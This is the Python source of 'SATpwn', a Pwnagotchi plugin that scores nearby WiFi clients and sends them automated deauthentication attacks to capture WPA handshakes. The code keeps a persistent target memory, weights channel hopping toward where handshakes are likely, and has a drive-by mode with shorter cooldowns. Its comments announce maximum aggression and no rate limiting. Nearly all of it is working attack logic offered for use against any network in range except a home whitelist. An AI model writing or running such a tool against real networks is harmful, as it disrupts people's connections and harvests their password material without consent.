import logging
import pwnagotchi.plugins as plugins
import pwnagotchi.ui.components as components
import pwnagotchi.ui.view as view
from flask import Response
import random
import json
import os
import time
from concurrent.futures import ThreadPoolExecutor
try:
    import tomllib
except ImportError:
    try:
        import tomli as tomllib
    except ImportError:
        import toml as tomllib

class SATpwn(plugins.Plugin):
    __author__ = 'Renmeii x Mr-Cass-Ette and discoJack too '
    __version__ = '88.0.5'
    __license__ = 'GPL3'
    __description__ = 'SATpwn intelligent targeting system'

    # Class constants - optimized for maximum aggression
    AP_EXPIRY_SECONDS = 3600 * 48
    CLIENT_EXPIRY_SECONDS = 3600 * 24
    ATTACK_SCORE_THRESHOLD = 20
    ATTACK_COOLDOWN_SECONDS = 90
    SUCCESS_BONUS_DURATION_SECONDS = 1800
    SCORE_DECAY_PENALTY_PER_HOUR = 2
    PMKID_FRIENDLY_APS_THRESHOLD = 3
    PMKID_FRIENDLY_BOOST_FACTOR = 1.5
    HANDSHAKE_WEIGHT = 10
    CLIENT_WEIGHT = 1
    SCORE_RECALCULATION_INTERVAL_SECONDS = 30
    EXPLORATION_PROBABILITY = 0.1
    DRIVE_BY_AP_EXPIRY_SECONDS = 1800
    DRIVE_BY_CLIENT_EXPIRY_SECONDS = 900
    DRIVE_BY_ATTACK_SCORE_THRESHOLD = 5
    DRIVE_BY_ATTACK_COOLDOWN_SECONDS = 30

    STATIONARY_SECONDS = 3600
    ACTIVITY_THRESHOLD = 5
    ACTIVITY_WINDOW_SECONDS = 300

    def __init__(self):
        self.ready = False
        self.agent = None
        self.memory = {}
        self.modes = ['strict', 'loose', 'drive-by', 'recon', 'auto']
        self.memory_path = '/etc/pwnagotchi/SATpwn_memory.json'
        self.executor = ThreadPoolExecutor(max_workers=3)
        self.mode = self.modes[0]
        self.channel_stats = {}
        self.memory_is_dirty = True
        self.recon_channel_iterator = None
        self.recon_channels_tested = []

        self._last_activity_check = 0
        self._activity_history = []
        self.home_whitelist = set()
        self._current_auto_submode = None
        self._stationary_start = None

        self.plugin_enabled = True
        
        self.attack_count = 0
        self.attack_success_count = 0

        self.running = False
        logging.info("[SATpwn] Plugin initializing...")
        self._load_config()

        if self.plugin_enabled:
            self.running = True
            logging.info("[SATpwn] Plugin initialization complete")
        else:
            logging.info("[SATpwn] Plugin disabled via configuration")

    def _load_config(self):
        """Load plugin configuration from nested TOML structure."""
        try:
            config_path = "/etc/pwnagotchi/config.toml"

            if not os.path.exists(config_path):
                logging.info("[SATpwn] No config.toml found - using defaults")
                self.home_whitelist = set()
                self.plugin_enabled = True
                return

            with open(config_path, "rb") as f:
                conf = tomllib.load(f)

            # Check for plugin configuration in nested structure
            if ('main' in conf and 
                'plugins' in conf['main'] and 
                'SATpwn' in conf['main']['plugins']):

                plugin_config = conf['main']['plugins']['SATpwn']

                if isinstance(plugin_config, bool):
                    self.plugin_enabled = plugin_config
                elif isinstance(plugin_config, dict):
                    self.plugin_enabled = plugin_config.get('enabled', True)
                else:
                    self.plugin_enabled = True

                logging.info(f"[SATpwn] Plugin enabled: {self.plugin_enabled}")
            else:
                self.plugin_enabled = True
                logging.info("[SATpwn] Plugin enabled by default")

            if not self.plugin_enabled:
                logging.info("[SATpwn] Plugin disabled - web interface only")
                self.home_whitelist = set()
                return

            # Load whitelist from main section
            if 'main' in conf and 'whitelist' in conf['main']:
                raw = conf['main']['whitelist']
                if isinstance(raw, str):
                    entries = [x.strip() for x in raw.split(',') if x.strip()]
                elif isinstance(raw, list):
                    entries = [str(x).strip() for x in raw if str(x).strip()]
                else:
                    entries = []
                self.home_whitelist = set(entries)
                logging.info(f"[SATpwn] Loaded whitelist: {len(self.home_whitelist)} entries")
            else:
                self.home_whitelist = set()

        except Exception as e:
            logging.error(f"[SATpwn] Error loading config: {e}")
            self.home_whitelist = set()
            self.plugin_enabled = True

    def _update_activity_history(self, new_ap_count):
        """Track new AP discoveries for movement detection."""
        now = time.time()
        self._activity_history.append((now, new_ap_count))
        cutoff = now - self.ACTIVITY_WINDOW_SECONDS
        self._activity_history = [(t, count) for t, count in self._activity_history if t > cutoff]

    def _is_stationary(self):
        """Detect if device has been stationary for extended period."""
        now = time.time()
        recent_activity = sum(count for t, count in self._activity_history 
                             if now - t <= self.ACTIVITY_WINDOW_SECONDS)
        low_activity = recent_activity < self.ACTIVITY_THRESHOLD

        if low_activity:
            if self._stationary_start is None:
                self._stationary_start = now
            elapsed = now - self._stationary_start
            return elapsed >= self.STATIONARY_SECONDS
        else:
            if self._stationary_start is not None:
                self._stationary_start = None
            return False

    def _is_moving(self):
        """Detect if device is moving based on AP discovery rate."""
        now = time.time()
        recent_activity = sum(count for t, count in self._activity_history 
                             if now - t <= self.ACTIVITY_WINDOW_SECONDS)
        return recent_activity >= self.ACTIVITY_THRESHOLD

    def _home_ssid_visible(self):
        """Check if any whitelisted home SSID/BSSID is visible."""
        if not self.home_whitelist:
            return False

        for ap_mac, ap in self.memory.items():
            ssid = ap.get("ssid", "")
            if ssid in self.home_whitelist or ap_mac in self.home_whitelist:
                return True
        return False

    def _auto_mode_logic(self):
        """Determine appropriate sub-mode for AUTO mode based on environment."""
        home_ssid_visible = self._home_ssid_visible()
        is_stationary = self._is_stationary()
        is_moving = self._is_moving()

        if home_ssid_visible or is_stationary:
            return 'recon'
        if is_moving:
            return 'drive-by'
        return 'loose' if len(self.memory) < 10 else 'strict'

    def _save_memory(self):
        """Persist plugin state and AP/client memory to disk."""
        try:
            memory_data = {
                "plugin_metadata": {
                    "current_mode": self.mode,
                    "last_saved": time.time(),
                    "version": self.__version__,
                    "stationary_start": self._stationary_start,
                    "plugin_enabled": self.plugin_enabled,
                    "attack_count": self.attack_count,
                    "attack_success_count": self.attack_success_count
                },
                "ap_data": self.memory
            }

            with open(self.memory_path, 'w') as f:
                json.dump(memory_data, f, indent=2)
        except Exception as e:
            logging.error(f"[SATpwn] Error saving memory: {e}")

    def _load_memory(self):
        """Load persisted plugin state and AP/client memory from disk."""
        if os.path.exists(self.memory_path):
            try:
                with open(self.memory_path, 'r') as f:
                    data = json.load(f)

                if "plugin_metadata" in data:
                    metadata = data["plugin_metadata"]
                    self.memory = data.get("ap_data", {})
                    saved_mode = metadata.get("current_mode", self.modes[0])
                    if saved_mode in self.modes:
                        self.mode = saved_mode
                    else:
                        self.mode = self.modes[0]
                    self._stationary_start = metadata.get("stationary_start", None)
                    self.attack_count = metadata.get("attack_count", 0)
                    self.attack_success_count = metadata.get("attack_success_count", 0)
                else:
                    self.memory = data
                    self.mode = self.modes[0]
                    self.attack_count = 0
                    self.attack_success_count = 0

            except Exception as e:
                logging.error(f"[SATpwn] Error loading memory: {e}")
                self.memory = {}
                self.mode = self.modes[0]
                self.attack_count = 0
                self.attack_success_count = 0
        else:
            logging.info("[SATpwn] No existing memory file found")

    def _cleanup_memory(self):
        """Remove expired APs and clients based on mode-specific expiry times."""
        if not self.plugin_enabled:
            return

        self.memory_is_dirty = True
        now = time.time()
        
        # Use mode-specific expiry values for efficiency
        ap_expiry = self.DRIVE_BY_AP_EXPIRY_SECONDS if self.mode == 'drive-by' else self.AP_EXPIRY_SECONDS
        client_expiry = self.DRIVE_BY_CLIENT_EXPIRY_SECONDS if self.mode == 'drive-by' else self.CLIENT_EXPIRY_SECONDS

        # Remove expired APs
        expired_aps = [ap_mac for ap_mac, data in self.memory.items()
                       if now - data.get("last_seen", 0) > ap_expiry]
        for ap_mac in expired_aps:
            if ap_mac in self.memory:
                del self.memory[ap_mac]

        # Remove expired clients from remaining APs
        for ap_mac in list(self.memory.keys()):
            if ap_mac not in self.memory: 
                continue
            clients = self.memory[ap_mac].get("clients", {})
            expired_clients = [client_mac for client_mac, data in clients.items()
                               if now - data.get("last_seen", 0) > client_expiry]
            for client_mac in expired_clients:
                if client_mac in clients:
                    del clients[client_mac]

    def _recalculate_client_score(self, ap_mac, client_mac):
        """Calculate client attack priority score with proper signal strength bounds."""
        client_data = self.memory[ap_mac]['clients'][client_mac]
        
        # Base score from signal strength with proper bounds (0-100)
        signal = client_data.get('signal', -100)
        base_score = max(0, min(100, signal + 100))
        score = base_score

        # Bonus for recently successful targets
        if client_data.get('last_success', 0) > time.time() - self.SUCCESS_BONUS_DURATION_SECONDS:
            score += 50

        # Age decay - penalize stale targets
        age_hours = (time.time() - client_data.get('last_seen', time.time())) / 3600
        decay_amount = age_hours * self.SCORE_DECAY_PENALTY_PER_HOUR
        score = max(0, score - decay_amount)

        client_data['score'] = score
        return score

    def _execute_attack(self, agent, ap_mac, client_mac):
        """Execute deauth attack on target - no artificial rate limiting."""
        if not self.plugin_enabled:
            return

        # Skip attacks in recon modes
        if self.mode == 'auto':
            sub_mode = self._auto_mode_logic()
            if sub_mode == 'recon':
                return
        elif self.mode == 'recon':
            return

        try:
            target_ap = None
            target_client = None
            
            # Get current APs - handle different pwnagotchi API versions
            current_aps = []
            if hasattr(agent, 'aps'):
                current_aps = agent.aps()
            elif hasattr(agent, 'get_aps'):
                current_aps = agent.get_aps()
            elif hasattr(agent, '_session') and hasattr(agent._session, 'aps'):
                current_aps = agent._session.aps()
            
            # Locate target in current scan
            for ap in current_aps:
                if ap['mac'].lower() == ap_mac.lower():
                    target_ap = ap
                    for client in ap.get('clients', []):
                        if client['mac'].lower() == client_mac.lower():
                            target_client = client
                            break
                    break
            
            if target_ap and target_client:
                # Execute deauth - NO RATE LIMITING
                agent.deauth(target_ap, target_client)
                self.attack_count += 1
                logging.info(f"[SATpwn] Attack #{self.attack_count}: {client_mac} via {ap_mac}")
            else:
                logging.debug(f"[SATpwn] Target not in range: {client_mac} via {ap_mac}")
                
        except Exception as e:
            logging.error(f"[SATpwn] Attack failed: {e}")

    def _get_channel_stats(self):
        """Generate channel statistics for weighted hopping decisions."""
        channel_stats = {}
        for ap_mac, ap_data in self.memory.items():
            ch = ap_data.get("channel")
            if ch is None: 
                continue
            if ch not in channel_stats:
                channel_stats[ch] = {'aps': 0, 'clients': 0, 'handshakes': 0}
            channel_stats[ch]['aps'] += 1
            channel_stats[ch]['clients'] += len(ap_data.get('clients', {}))
            channel_stats[ch]['handshakes'] += ap_data.get('handshakes', 0)
        return channel_stats

    def _channel_iterator(self, channels):
        """Infinite channel iterator for recon mode."""
        if not channels:
            return
        while True:
            for channel in channels:
                yield channel

    def on_loaded(self):
        """Called when plugin is loaded by pwnagotchi."""
        logging.info("[SATpwn] Plugin loaded")
        self._load_memory()
        if not self.plugin_enabled:
            logging.info("[SATpwn] Plugin disabled - web interface only")

    def on_unload(self, ui):
        """Called when plugin is unloaded."""
        self._save_memory()
        if hasattr(self, 'executor'):
            self.executor.shutdown(wait=False)
        logging.info("[SATpwn] Plugin unloaded")

    def on_ready(self, agent):
        """Called when agent is ready."""
        if not self.plugin_enabled:
            logging.info("[SATpwn] Plugin disabled")
            return

        self.agent = agent
        self.ready = True
        logging.info(f"[SATpwn] Ready - Mode: {self.mode}")

    def on_ui_setup(self, ui):
        """Setup UI display element."""
        if not self.plugin_enabled:
            return

        try:
            ui.add_element('sat_mode', components.Text(
                color=view.WHITE,
                value=f'SAT: {self.mode.capitalize()}',
                position=(5, 13)
            ))
        except Exception as e:
            logging.error(f"[SATpwn] UI setup error: {e}")

    def on_ui_update(self, ui):
        """Update UI display element."""
        if not self.plugin_enabled:
            return

        try:
            mode_text = self.mode.capitalize()
            if self.mode == 'auto' and self._current_auto_submode:
                mode_text += f" ({self._current_auto_submode})"
            ui.set('sat_mode', f'SAT: {mode_text}')
        except Exception as e:
            logging.debug(f"[SATpwn] UI update error: {e}")

    def on_wifi_update(self, agent, access_points):
        """Process WiFi scan results and trigger attacks on high-value targets."""
        if not self.plugin_enabled:
            return

        now = time.time()
        new_ap_count = 0

        try:
            for ap in access_points:
                ap_mac = ap['mac'].lower()
                if ap_mac not in self.memory:
                    new_ap_count += 1
                    self.memory[ap_mac] = {
                        "ssid": ap.get('hostname', ''), 
                        "channel": ap.get('channel', 0), 
                        "clients": {}, 
                        "last_seen": now, 
                        "handshakes": 0
                    }
                else:
                    self.memory[ap_mac].update({
                        'last_seen': now, 
                        'ssid': ap.get('hostname', ''), 
                        'channel': ap.get('channel', 0)
                    })

                for client in ap.get('clients', []):
                    client_mac = client['mac'].lower()

                    if client_mac not in self.memory[ap_mac]['clients']:
                        self.memory[ap_mac]['clients'][client_mac] = {
                            "last_seen": now, 
                            "signal": client.get('rssi', -100), 
                            "score": 0, 
                            "last_attempt": 0, 
                            "last_success": 0,
                            "last_recalculated": 0
                        }
                    else:
                        self.memory[ap_mac]['clients'][client_mac].update({
                            'last_seen': now, 
                            'signal': client.get('rssi', -100)
                        })

                    client_data = self.memory[ap_mac]['clients'][client_mac]

                    # Throttle score recalculation to reduce CPU overhead
                    last_recalculated = client_data.get('last_recalculated', 0)
                    if now - last_recalculated > self.SCORE_RECALCULATION_INTERVAL_SECONDS:
                        score = self._recalculate_client_score(ap_mac, client_mac)
                        client_data['last_recalculated'] = now
                    else:
                        score = client_data.get('score', 0)

                    # Determine attack thresholds based on current mode
                    last_attempt = client_data.get('last_attempt', 0)
                    attack_score_threshold = (self.DRIVE_BY_ATTACK_SCORE_THRESHOLD 
                                            if self.mode == 'drive-by' 
                                            else self.ATTACK_SCORE_THRESHOLD)
                    attack_cooldown = (self.DRIVE_BY_ATTACK_COOLDOWN_SECONDS 
                                     if self.mode == 'drive-by' 
                                     else self.ATTACK_COOLDOWN_SECONDS)

                    # Submit attack if criteria met - per-client cooldown prevents redundancy
                    if score >= attack_score_threshold and (now - last_attempt > attack_cooldown):
                        client_data['last_attempt'] = now
                        self.executor.submit(self._execute_attack, agent, ap_mac, client_mac)

            self._update_activity_history(new_ap_count)
            self.memory_is_dirty = True
            
        except Exception as e:
            logging.error(f"[SATpwn] WiFi update error: {e}")

    def on_handshake(self, agent, filename, ap, client):
        """Track captured handshakes and update target scoring."""
        if not self.plugin_enabled:
            return

        try:
            ap_mac = ap['mac'].lower()
            client_mac = client['mac'].lower()
            
            # Increment AP handshake counter
            if ap_mac in self.memory:
                self.memory[ap_mac]['handshakes'] = self.memory[ap_mac].get('handshakes', 0) + 1

            # Check if handshake resulted from our recent attack
            if (ap_mac in self.memory and 
                client_mac in self.memory[ap_mac]['clients']):
                
                last_attempt = self.memory[ap_mac]['clients'][client_mac].get('last_attempt', 0)
                if time.time() - last_attempt < 60:
                    self.attack_success_count += 1
                    logging.info(f"[SATpwn] Success! {self.attack_success_count}/{self.attack_count}")
                
                # Mark success and boost future targeting priority
                self.memory[ap_mac]['clients'][client_mac]['last_success'] = time.time()
                self._recalculate_client_score(ap_mac, client_mac)

            self.memory_is_dirty = True
            
        except Exception as e:
            logging.error(f"[SATpwn] Handshake processing error: {e}")

    def _epoch_strict(self, agent, epoch, epoch_data, supported_channels):
        """Strict mode: weighted channel selection prioritizing active channels."""
        if self.memory_is_dirty or not self.channel_stats:
            self.channel_stats = self._get_channel_stats()
            self.memory_is_dirty = False

        channels = list(self.channel_stats.keys())
        if not channels:
            next_channel = random.choice(supported_channels)
            agent.set_channel(next_channel)
            return

        # Calculate channel weights based on activity
        weights = []
        for ch in channels:
            stats = self.channel_stats.get(ch, {'clients': 0, 'handshakes': 0, 'aps': 0})
            weight = (stats['clients'] * self.CLIENT_WEIGHT) + (stats['handshakes'] * self.HANDSHAKE_WEIGHT)
            if stats['aps'] > self.PMKID_FRIENDLY_APS_THRESHOLD and stats['aps'] > stats['clients']:
                weight *= self.PMKID_FRIENDLY_BOOST_FACTOR
            weights.append(weight)

        # Filter to device-supported channels
        supported_channels_with_weights = []
        supported_weights = []
        for i, ch in enumerate(channels):
            if ch in supported_channels:
                supported_channels_with_weights.append(ch)
                supported_weights.append(weights[i])

        # Select next channel using weighted random selection
        if not supported_channels_with_weights:
            next_channel = random.choice(supported_channels)
        else:
            total_weight = sum(supported_weights)
            if total_weight == 0:
                next_channel = random.choice(supported_channels_with_weights)
            else:
                next_channel = random.choices(supported_channels_with_weights, weights=supported_weights, k=1)[0]

        agent.set_channel(next_channel)

    def _epoch_loose(self, agent, epoch, epoch_data, supported_channels):
        """Loose mode: strict mode with 10% exploration probability."""
        if self.memory_is_dirty or not self.channel_stats:
            self.channel_stats = self._get_channel_stats()
            self.memory_is_dirty = False

        # 10% chance to explore random channel
        if random.random() < self.EXPLORATION_PROBABILITY:
            next_channel = random.choice(supported_channels)
            agent.set_channel(next_channel)
            return

        # Otherwise use strict weighted selection
        self._epoch_strict(agent, epoch, epoch_data, supported_channels)

    def _epoch_driveby(self, agent, epoch, epoch_data, supported_channels):
        """Drive-by mode: strict logic with aggressive timing constants."""
        self._epoch_strict(agent, epoch, epoch_data, supported_channels)

    def _epoch_recon(self, agent, epoch, epoch_data, supported_channels):
        """Recon mode: systematic channel survey without attacks."""
        if self.recon_channel_iterator is None:
            self.recon_channel_iterator = self._channel_iterator(supported_channels)
            self.recon_channels_tested = []

        if len(self.recon_channels_tested) >= len(supported_channels):
            # Survey complete, switch to strict targeting
            self._epoch_strict(agent, epoch, epoch_data, supported_channels)
            return

        try:
            next_channel = next(self.recon_channel_iterator)
            if next_channel not in self.recon_channels_tested:
                self.recon_channels_tested.append(next_channel)
                agent.set_channel(next_channel)
            else:
                # Skip already tested channel
                self._epoch_recon(agent, epoch, epoch_data, supported_channels)
        except StopIteration:
            self._epoch_strict(agent, epoch, epoch_data, supported_channels)

    def on_epoch(self, agent, epoch, epoch_data):
        """Called each epoch for channel hopping and memory management."""
        if not self.plugin_enabled or not self.ready:
            return

        try:
            self._cleanup_memory()
            self._save_memory()

            supported_channels = agent.supported_channels()
            if not supported_channels:
                return

            # Route to appropriate mode handler
            if self.mode == 'auto':
                sub_mode = self._auto_mode_logic()
                self._current_auto_submode = sub_mode
                if sub_mode == 'recon':
                    self._epoch_recon(agent, epoch, epoch_data, supported_channels)
                elif sub_mode == 'drive-by':
                    self._epoch_driveby(agent, epoch, epoch_data, supported_channels)
                elif sub_mode == 'loose':
                    self._epoch_loose(agent, epoch, epoch_data, supported_channels)
                else:
                    self._epoch_strict(agent, epoch, epoch_data, supported_channels)
            elif self.mode == 'loose':
                self._epoch_loose(agent, epoch, epoch_data, supported_channels)
            elif self.mode == 'drive-by':
                self._epoch_driveby(agent, epoch, epoch_data, supported_channels)
            elif self.mode == 'recon':
                self._epoch_recon(agent, epoch, epoch_data, supported_channels)
            else:
                self._epoch_strict(agent, epoch, epoch_data, supported_channels)

        except Exception as e:
            logging.error(f"[SATpwn] Epoch error: {e}")

    def on_webhook(self, path, request):
        """Handle web dashboard and mode toggle requests."""
        if path == 'toggle_mode':
            if not self.plugin_enabled:
                return Response('<html><head><meta http-equiv="refresh" content="0; url=/plugins/SATpwn/" /></head></html>', mimetype='text/html')

            try:
                current_index = self.modes.index(self.mode)
                next_index = (current_index + 1) % len(self.modes)
                old_mode = self.mode
                self.mode = self.modes[next_index]

                # Reset mode-specific state
                if self.mode == 'recon':
                    self.recon_channel_iterator = None
                    self.recon_channels_tested = []
                elif self.mode == 'auto':
                    self._current_auto_submode = None

                self._save_memory()
                logging.info(f"[SATpwn] Mode: {old_mode} → {self.mode}")
            except Exception as e:
                logging.error(f"[SATpwn] Mode toggle error: {e}")

            return Response('<html><head><meta http-equiv="refresh" content="0; url=/plugins/SATpwn/" /></head></html>', mimetype='text/html')

        if path == '/' or not path:
            try:
                return self._generate_dashboard()
            except Exception as e:
                logging.error(f"[SATpwn] Dashboard error: {e}")
                return Response(f"<html><body><h1>SATpwn Dashboard Error</h1><p>{str(e)}</p></body></html>", mimetype='text/html')

        return Response("Not Found", status=404, mimetype='text/html')

    def _generate_dashboard(self):
        """Generate HTML dashboard interface."""
        if not self.plugin_enabled:
            return Response("""
            <html>
            <head><title>SATpwn - DISABLED</title>
            <style>body{font-family:monospace;background:#1e1e1e;color:#d4d4d4;padding:20px;}
            .card{background:#252526;border:1px solid #333;padding:15px;margin:10px 0;border-radius:5px;}
            h1{color:#f44336;}code{background:#333;padding:2px 4px;}</style>
            </head>
            <body>
            <h1>SATpwn Dashboard - DISABLED</h1>
            <div class="card">
            <p>Enable in config.toml:</p>
            <p><code>[main.plugins]<br>SATpwn.enabled = true</code></p>
            <p>Then restart: <code>sudo systemctl restart pwnagotchi</code></p>
            </div></body></html>
            """, mimetype='text/html')

        # Update stats
        if self.memory_is_dirty or not self.channel_stats:
            self.channel_stats = self._get_channel_stats()
            self.memory_is_dirty = False

        total_aps = len(self.memory)
        total_clients = sum(len(ap.get('clients', {})) for ap in self.memory.values())
        success_rate = (self.attack_success_count / max(self.attack_count, 1) * 100) if self.attack_count > 0 else 0

        # Generate channel stats table
        channel_html = "<table><tr><th>Ch</th><th>APs</th><th>Clients</th><th>Handshakes</th></tr>"
        if self.channel_stats:
            for ch, stats in sorted(self.channel_stats.items()):
                channel_html += f"<tr><td>{ch}</td><td>{stats['aps']}</td><td>{stats['clients']}</td><td>{stats['handshakes']}</td></tr>"
        else:
            channel_html += "<tr><td colspan='4'>Gathering data...</td></tr>"
        channel_html += "</table>"

        # Generate AP memory table sorted by highest client score
        memory_html = "<table><tr><th>AP</th><th>Ch</th><th>Clients</th><th>Max Score</th></tr>"
        if self.memory:
            # Sort by highest scoring client first, then by last_seen
            sorted_aps = sorted(
                self.memory.items(),
                key=lambda x: (
                    max((client.get('score', 0) for client in x[1].get('clients', {}).values()), default=0),
                    x[1].get('last_seen', 0)
                ),
                reverse=True
            )
            for ap_mac, ap_data in sorted_aps[:15]:
                client_count = len(ap_data.get('clients', {}))
                max_score = 0
                if ap_data.get('clients'):
                    max_score = max(client.get('score', 0) for client in ap_data['clients'].values())
                memory_html += f"<tr><td>{ap_data.get('ssid', 'N/A')}<br><small>{ap_mac[:17]}</small></td><td>{ap_data.get('channel', '-')}</td><td>{client_count}</td><td>{max_score:.1f}</td></tr>"
            if len(self.memory) > 15:
                memory_html += f"<tr><td colspan='4'><i>+{len(self.memory) - 15} more</i></td></tr>"
        else:
            memory_html += "<tr><td colspan='4'>No APs yet</td></tr>"
        memory_html += "</table>"

        # Mode button
        next_mode_index = (self.modes.index(self.mode) + 1) % len(self.modes)
        next_mode_name = self.modes[next_mode_index].replace('-', ' ').title()
        mode_button = f"<a href='/plugins/SATpwn/toggle_mode' style='display:inline-block;padding:8px 12px;background:#569cd6;color:#fff;text-decoration:none;border-radius:4px;'>→ {next_mode_name}</a>"

        # Auto mode status
        auto_status = ""
        if self.mode == 'auto':
            home = self._home_ssid_visible()
            stationary = self._is_stationary()
            moving = self._is_moving()
            sub = self._current_auto_submode or "..."
            activity = sum(count for t, count in self._activity_history 
                          if time.time() - t <= self.ACTIVITY_WINDOW_SECONDS)
            auto_status = f"<p><b>Sub:</b> {sub.upper()}</p><p><b>Activity:</b> {activity}/5min</p><p><b>Home:</b> {'✓' if home else '✗'} <b>Moving:</b> {'✓' if moving else '✗'}</p>"

        # Recon status
        recon_status = ""
        if self.mode == 'recon':
            tested = len(self.recon_channels_tested) if self.recon_channels_tested else 0
            total = len(self.agent.supported_channels()) if self.agent else 0
            recon_status = f"<p><b>Progress:</b> {tested}/{total}</p>"

        # Show attack thresholds for current mode
        current_threshold = self.DRIVE_BY_ATTACK_SCORE_THRESHOLD if self.mode == 'drive-by' else self.ATTACK_SCORE_THRESHOLD
        current_cooldown = self.DRIVE_BY_ATTACK_COOLDOWN_SECONDS if self.mode == 'drive-by' else self.ATTACK_COOLDOWN_SECONDS

        html = f"""
        <html>
        <head><title>SATpwn v{self.__version__}</title>
        <style>
        body{{font-family:monospace;background:#1e1e1e;color:#d4d4d4;margin:0;padding:20px;}}
        .container{{max-width:1200px;margin:0 auto;}}
        .grid-3{{display:grid;grid-template-columns:1fr 1fr 1fr;gap:15px;margin-bottom:15px;}}
        .grid-2{{display:grid;grid-template-columns:1fr 1fr;gap:15px;margin-bottom:15px;}}
        .card{{background:#252526;border:1px solid #333;border-radius:5px;padding:15px;}}
        h1{{color:#569cd6;margin:0 0 20px 0;}}
        h2{{color:#569cd6;border-bottom:1px solid #333;padding-bottom:5px;margin:0 0 10px 0;}}
        table{{width:100%;border-collapse:collapse;font-size:12px;}}
        th,td{{border:1px solid #444;padding:4px;text-align:left;}}
        th{{background:#333;}}
        small{{color:#888;}}
        a{{color:#569cd6;text-decoration:none;}}
        .threshold{{color:#ff6b6b;font-weight:bold;}}
        @media(max-width:768px){{.grid-3,.grid-2{{grid-template-columns:1fr;}}}}
        </style>
        </head>
        <body>
        <div class="container">
        <h1>SATpwn v{self.__version__}</h1>
        
        <div class="grid-3">
        <div class="card">
        <h2>Stats</h2>
        <p><b>APs:</b> {total_aps}</p>
        <p><b>Clients:</b> {total_clients}</p>
        <p><b>Attacks:</b> {self.attack_count}</p>
        <p><b>Success:</b> {success_rate:.1f}%</p>
        </div>
        
        <div class="card">
        <h2>Mode: {self.mode.upper()}</h2>
        <p class="threshold"><b>Threshold:</b> {current_threshold}</p>
        <p class="threshold"><b>Cooldown:</b> {current_cooldown}s</p>
        {recon_status}
        {mode_button}
        </div>
        
        <div class="card">
        <h2>Status</h2>
        <p><b>Rate Limit:</b> <span style="color:#00ff00;">DISABLED</span></p>
        <p><b>Thread Pool:</b> 3 workers</p>
        </div>
        </div>
        
        <div class="grid-2">
        <div class="card">
        <h2>Channels</h2>
        {channel_html}
        </div>
        
        <div class="card">
        <h2>AUTO Mode</h2>
        {auto_status if auto_status else '<p>Not in AUTO mode</p>'}
        </div>
        </div>
        
        <div class="card">
        <h2>Access Points (Highest Scoring Targets)</h2>
        {memory_html}
        </div>
        
        </div>
        </body>
        </html>
        """
        return Response(html, mimetype='text/html')
